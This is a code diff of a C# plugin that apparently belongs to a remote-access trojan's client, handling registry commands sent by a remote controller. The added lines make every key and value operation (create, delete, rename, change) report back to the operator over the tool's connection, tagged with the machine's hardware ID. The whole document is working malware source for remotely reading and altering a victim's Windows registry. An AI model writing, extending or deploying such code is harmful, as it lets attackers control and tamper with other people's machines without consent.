@@ -1,17 +1,11 @@
 ﻿using System;
-using System.Drawing;
-using System.Drawing.Imaging;
 using System.IO;
-using System.Text;
-using System.Diagnostics;
-using System.Threading;
 using MessagePackLib.MessagePack;
-using System.Runtime.InteropServices;
 using Microsoft.Win32;
-using System.Text.RegularExpressions;
 using System.Runtime.Serialization.Formatters.Binary;
 using static Plugin.Handler.RegistrySeeker;
 using ProtoBuf;
+using System.Windows.Forms;
 
 namespace Plugin.Handler
 {
@@ -25,7 +19,7 @@ namespace Plugin.Handler
                 {
                     case "LoadRegistryKey":
                         {
-                            string RootKeyName = unpack_msgpack.ForcePathObject("RootKeyName").AsString;
+                            string RootKeyName = unpack_msgpack.ForcePathObject("RootKeyName").AsString;                            
                             LoadKey(RootKeyName);
                             break;
                         }
@@ -89,7 +83,6 @@ namespace Plugin.Handler
             }
             catch (Exception ex)
             {
-                Debug.WriteLine(ex.Message);
                 Packet.Error(ex.Message);
             }
         }
@@ -102,7 +95,25 @@ namespace Plugin.Handler
                 Serializer.Serialize(ms, Matches);
                 return ms.ToArray();
             }
-        }        
+        }
+
+        public static byte[] Serialize(RegSeekerMatch Matche)
+        {
+            using (MemoryStream ms = new MemoryStream())
+            {
+                Serializer.Serialize(ms, Matche);
+                return ms.ToArray();
+            }
+        }
+
+        public static byte[] Serialize(RegValueData Value)
+        {
+            using (MemoryStream ms = new MemoryStream())
+            {
+                Serializer.Serialize(ms, Value);
+                return ms.ToArray();
+            }
+        }
 
 
         public void LoadKey(string RootKeyName)
@@ -111,12 +122,6 @@ namespace Plugin.Handler
             {
                 RegistrySeeker seeker = new RegistrySeeker();
                 seeker.BeginSeeking(RootKeyName);
-
-
-                //BinaryFormatter formatter = new BinaryFormatter();
-                //MemoryStream mStream = new MemoryStream();
-                //formatter.Serialize(mStream, seeker.Matches);
-                //mStream.Flush();
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
@@ -153,10 +158,23 @@ namespace Plugin.Handler
         {
             string errorMsg;
             string newKeyName = "";
-
             try
             {
                 RegistryEditor.CreateRegistryKey(ParentPath, out newKeyName, out errorMsg);
+                var Match = new RegSeekerMatch
+                {
+                    Key = newKeyName,
+                    Data = RegistryKeyHelper.GetDefaultValues(),
+                    HasSubKeys = false
+                };
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("Command").AsString = "CreateKey";
+                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
+                msgpack.ForcePathObject("Match").SetAsBytes(Serialize(Match));
+                Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
@@ -169,6 +187,14 @@ namespace Plugin.Handler
             try
             {
                 RegistryEditor.DeleteRegistryKey(KeyName, ParentPath, out errorMsg);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("Command").AsString = "DeleteKey";
+                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
+                msgpack.ForcePathObject("KeyName").AsString = KeyName;
+                Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
@@ -181,11 +207,20 @@ namespace Plugin.Handler
             try
             {
                 RegistryEditor.RenameRegistryKey(OldKeyName, NewKeyName, ParentPath, out errorMsg);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("Command").AsString = "RenameKey";
+                msgpack.ForcePathObject("rootKey").AsString = ParentPath;
+                msgpack.ForcePathObject("oldName").AsString = OldKeyName;
+                msgpack.ForcePathObject("newName").AsString = NewKeyName;
+                Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
                 Packet.Error(ex.Message);
-            }
+            }            
         }
         public void CreateValue(string KeyPath, string Kindstring)
         {
@@ -238,6 +273,15 @@ namespace Plugin.Handler
             try
             {
                 RegistryEditor.CreateRegistryValue(KeyPath, Kind, out newKeyName, out errorMsg);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("Command").AsString = "CreateValue";
+                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
+                msgpack.ForcePathObject("Kindstring").AsString = Kindstring;
+                msgpack.ForcePathObject("newKeyName").AsString = newKeyName;
+                Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
@@ -250,6 +294,14 @@ namespace Plugin.Handler
             try
             {
                 RegistryEditor.DeleteRegistryValue(KeyPath, ValueName, out errorMsg);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("Command").AsString = "DeleteValue";
+                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
+                msgpack.ForcePathObject("ValueName").AsString = ValueName;
+                Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
@@ -262,6 +314,15 @@ namespace Plugin.Handler
             try
             {
                 RegistryEditor.RenameRegistryValue(OldValueName, NewValueName, KeyPath, out errorMsg);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("Command").AsString = "RenameValue";
+                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
+                msgpack.ForcePathObject("OldValueName").AsString = OldValueName;
+                msgpack.ForcePathObject("NewValueName").AsString = NewValueName;
+                Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
@@ -274,6 +335,14 @@ namespace Plugin.Handler
             try
             {
                 RegistryEditor.ChangeRegistryValue(Value, KeyPath, out errorMsg);
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
+                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
+                msgpack.ForcePathObject("Command").AsString = "ChangeValue";
+                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
+                msgpack.ForcePathObject("Value").SetAsBytes(Serialize(Value));
+                Connection.Send(msgpack.Encode2Bytes());
             }
             catch (Exception ex)
             {
